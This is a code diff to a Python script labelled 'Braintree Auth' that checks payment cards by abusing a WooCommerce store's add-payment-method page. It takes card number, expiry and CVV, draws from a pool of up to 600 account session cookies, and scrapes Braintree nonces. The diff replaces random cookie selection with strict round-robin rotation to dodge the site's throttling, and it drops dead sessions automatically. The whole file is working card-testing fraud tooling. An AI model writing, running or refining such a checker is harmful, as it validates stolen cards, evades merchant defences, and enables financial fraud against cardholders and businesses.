@@ -29,8 +29,12 @@ GATEWAY_NAME = "Braintree Auth"
 CREDIT = "@xoxhunterxd"
 BASE_URL = (os.environ.get("BASE_URL") or os.environ.get("URL") or "").rstrip("/")
 PROXY_URL = (os.environ.get("PROXY") or "").strip()          # set via env — never in code
-COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_pool_lm.json")
-STATS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookies_stats_lm.json")
+
+# Pool survives redeploys only on a mounted volume — set POOL_DIR to the
+# volume's mount path (e.g. /data). Container-local paths wipe on redeploy.
+POOL_DIR = os.environ.get("POOL_DIR") or os.path.dirname(os.path.abspath(__file__))
+COOKIE_FILE = os.path.join(POOL_DIR, "cookies_pool_lm.json")
+STATS_FILE = os.path.join(POOL_DIR, "cookies_stats_lm.json")
 
 MAX_ACCOUNTS = int(os.environ.get("MAX_ACCOUNTS", "600"))
 MIN_ACCOUNTS = int(os.environ.get("MIN_ACCOUNTS", "20"))
@@ -105,32 +109,24 @@ def bump_fail_reason(reason):
         save_stats(st)
 
 
-# ─── Cookie picker — random per card, 30s cooldown per cookie ──
-# Same session hammered back-to-back draws a ~20s pause from the site, so
-# every card takes a RANDOM cookie and no cookie repeats within 30 seconds.
-COOKIE_COOLDOWN = float(os.environ.get("COOKIE_COOLDOWN", "30"))
-_last_used = {}                       # email -> last-use timestamp
-_last_used_lock = threading.Lock()
+# ─── Cookie picker — strict round-robin through the whole pool ──
+# Use every account exactly once: #1, #2, ... last, then start over from #1.
+# No cookie repeats until the entire pool has completed one full cycle.
+_rr_index = 0
+_rr_lock = threading.Lock()
 
 def pick_cookie():
-    """Random live cookie whose 30s cooldown has passed. If every cookie is
-    cooling (tiny pool), take the least-recently-used so we never stall."""
+    """Next cookie in line — full cycle before any repeat. Dead cookies are
+    removed from the pool so the cycle only walks live accounts; new accounts
+    append at the end and get picked when the cycle reaches them."""
+    global _rr_index
     pool = load_pool()
     if not pool:
         return None
-    now = time.time()
-    with _last_used_lock:
-        live = {e.get("email") for e in pool}
-        for k in [k for k in list(_last_used) if k not in live]:
-            _last_used.pop(k, None)
-        fresh = [e for e in pool if _last_used.get(e.get("email"), 0) < now - COOKIE_COOLDOWN]
-        if fresh:
-            ent = random.choice(fresh)
-        else:
-            # all cooling — least recently used wins
-            ent = min(pool, key=lambda e: _last_used.get(e.get("email"), 0))
-        _last_used[ent.get("email")] = now
-        return ent
+    with _rr_lock:
+        idx = _rr_index % len(pool)
+        _rr_index += 1
+    return pool[idx]
 
 
 def remove_cookie_entry(email):
@@ -579,13 +575,22 @@ def check_card(cc, mm, yy, cvv, proxy=None):
             s.cookies.set(k, v)
 
     ae = an = r = None
-    # 1. apm page — random cookie with 30s cooldown; on death, pick another
+    # 1. apm page — round-robin cookie; dead session (redirect OR login wall
+    #    served at the same URL with no nonce anywhere) rotates to the next
     try:
+        def page_nonce(html):
+            soup = BeautifulSoup(html, "html.parser")
+            inp = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
+            if inp:
+                return inp.get("value")
+            nm = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([a-f0-9]+)["\']', html)
+            return nm.group(1) if nm else None
+
         r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=25)
-        soup = BeautifulSoup(r.text, "html.parser")
-        ae = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
+        an = page_nonce(r.text)
         dead = ((r.status_code == 200 and "add-payment-method" not in r.url)
-                or r.status_code in (301, 302)) and not ae
+                or r.status_code in (301, 302)
+                or not an)                       # login wall at same URL = dead too
         if dead:
             if saved_entry and saved_entry.get("email"):
                 remove_cookie_entry(saved_entry["email"])
@@ -597,9 +602,8 @@ def check_card(cc, mm, yy, cvv, proxy=None):
                 for k, v in alt_entry.get("cookies", {}).items():
                     s.cookies.set(k, v)
                 r = s.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=25)
-                soup = BeautifulSoup(r.text, "html.parser")
-                ae = soup.find("input", {"name": "woocommerce-add-payment-method-nonce"})
-                if ae:
+                an = page_nonce(r.text)
+                if an:
                     break
                 if alt_entry.get("email"):
                     remove_cookie_entry(alt_entry["email"])
@@ -610,13 +614,8 @@ def check_card(cc, mm, yy, cvv, proxy=None):
 
     # 2. nonces
     try:
-        if not ae:
-            nm = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([a-f0-9]+)["\']', r.text)
-            if not nm:
-                return result("No nonce")
-            an = nm.group(1)
-        else:
-            an = ae.get("value")
+        if not an:
+            return result("No nonce")
         cm = re.search(r'"client_token_nonce":"([a-f0-9]+)"', r.text) \
             or re.search(r'client_token_nonce["\']?\s*:\s*["\']([a-f0-9]+)["\']', r.text)
         if not cm:
